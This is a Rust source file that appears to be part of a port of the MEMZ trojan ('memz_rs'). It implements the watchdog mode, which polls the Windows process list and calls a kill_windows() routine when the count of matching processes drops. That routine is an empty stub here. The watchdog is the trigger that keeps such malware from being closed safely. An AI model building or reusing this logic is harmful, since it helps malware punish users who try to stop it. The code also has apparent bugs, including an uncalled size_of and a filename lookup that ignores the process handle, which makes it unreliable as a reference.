#![allow(unused_imports)]
#![allow(dead_code)]
use memz_rs::{
    wrap_windows_api::{
        lstrcmp_w, wrap_close_handle, wrap_create_toolhelp32_snapshot,
        wrap_get_process_image_filename_a, wrap_process32_next, Commandline, Resolution,
    },
    LMEM_ZEROINIT,
};
use std::{
    mem::size_of,
    thread::{self, sleep},
    time::Duration,
};
use windows::{
    Win32::{
        Foundation::{BOOL, HANDLE, HWND, INVALID_HANDLE_VALUE},
        Graphics::Gdi::HFONT,
        System::{
            Diagnostics::ToolHelp::{Process32First, PROCESSENTRY32},
            Threading::{OpenProcess, PROCESS_QUERY_INFORMATION},
        },
    },
};

// #[cfg(feature="CLEAN")]
struct Clean {
    main_window: HWND,
    font: HFONT,
    dialog: HWND,
}

fn kill_windows() {}

fn main() -> windows::core::Result<()> {
    let res = Resolution::new();
    println!("{} {}", res.scrw, res.scrh);

    // #[cfg(feature="CLEAN")]
    {
        let cmdline = Commandline::new();
        let argc = cmdline.argc;
        let arg = cmdline.arg;

        if argc > 1 {
            if lstrcmp_w(arg, "/watchdog") {
                let watchdog_thread = thread::spawn(move || -> Result<(), ()> {
                    let mut oproc = 0;
                    let mut f_buf1: Vec<u8> = vec![LMEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
                    wrap_get_process_image_filename_a(&mut f_buf1)?;

                    sleep(Duration::from_millis(1000));

                    loop {
                        let snapshot = wrap_create_toolhelp32_snapshot()?;

                        let mut proc: PROCESSENTRY32 = PROCESSENTRY32 {
                            dwSize: size_of::<PROCESSENTRY32> as u32,
                            ..Default::default()
                        };

                        unsafe {
                            Process32First(snapshot, &mut proc as *mut PROCESSENTRY32);
                        }

                        let mut nproc = 0;
                        loop {
                            let h_proc: Option<HANDLE>;
                            unsafe {
                                h_proc = match OpenProcess(
                                    PROCESS_QUERY_INFORMATION,
                                    BOOL(0),
                                    proc.th32ProcessID,
                                ) {
                                    Ok(handle) => Some(handle),
                                    Err(e) => {
                                        eprintln!("{e}");
                                        None
                                    }
                                };
                            }
                            let mut f_buf2: Vec<u8> = vec![LMEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
                            wrap_get_process_image_filename_a(&mut f_buf2)?;

                            if f_buf1 != f_buf2 {
                                nproc += 1;
                            }

                            wrap_close_handle(h_proc.unwrap_or(INVALID_HANDLE_VALUE))?;
                            drop(f_buf2);

                            if wrap_process32_next(snapshot, &mut proc)? {
                                break;
                            }
                        }
                        wrap_close_handle(snapshot)?;

                        if nproc < oproc {
                            kill_windows()
                        }

                        oproc = nproc;

                        sleep(Duration::from_millis(10));
                    }
                });
                watchdog_thread.join().unwrap().unwrap();
            }
        }
    }
    Ok(())
}
